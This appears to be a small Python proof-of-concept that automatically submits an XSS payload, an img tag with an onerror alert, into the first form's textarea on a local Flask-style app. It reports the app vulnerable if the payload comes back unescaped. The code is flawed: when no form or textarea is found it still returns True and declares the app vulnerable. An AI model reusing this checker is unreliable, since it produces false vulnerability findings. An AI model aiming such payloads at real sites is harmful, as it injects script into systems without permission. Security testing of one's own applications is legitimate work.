'''
    auto-exploit vulnerability xss
    payload : <img src='foo' onerror='alert(1)'/> 
'''
import requests
import mechanize
from bs4 import BeautifulSoup


URL = 'http://127.0.0.1:5000/'
PAYLOAD = '<img src="foo" onerror="alert(\'vulnerable test\');" />'

def submit_form(form):
    textarea = form.textarea
    if textarea:
        form_submit = mechanize.Browser()
        form_submit.open(URL)
        form_submit.select_form(form.get('name'))
        form_submit.form[textarea.get('name')] = PAYLOAD
        form_submit.submit()

        final_result = form_submit.response().read().decode()
        is_vulnerable = bool(final_result.find(PAYLOAD) > 0)
        return is_vulnerable
    else:
        # No textarea is found
        return True


def attack():
    request = requests.get(URL)
    parsedHTML = BeautifulSoup(request.text, 'html.parser')
    form = parsedHTML.form
    if form:
        return submit_form(form)
    else:
        # No form is found
        return True


def main():
	res = attack()
	if res:
		msg = "The app is vulnerable"
	else:
		msg = "You are in good hands"
	return (res, msg)

if __name__ == '__main__':
	res = main()
	print(res)
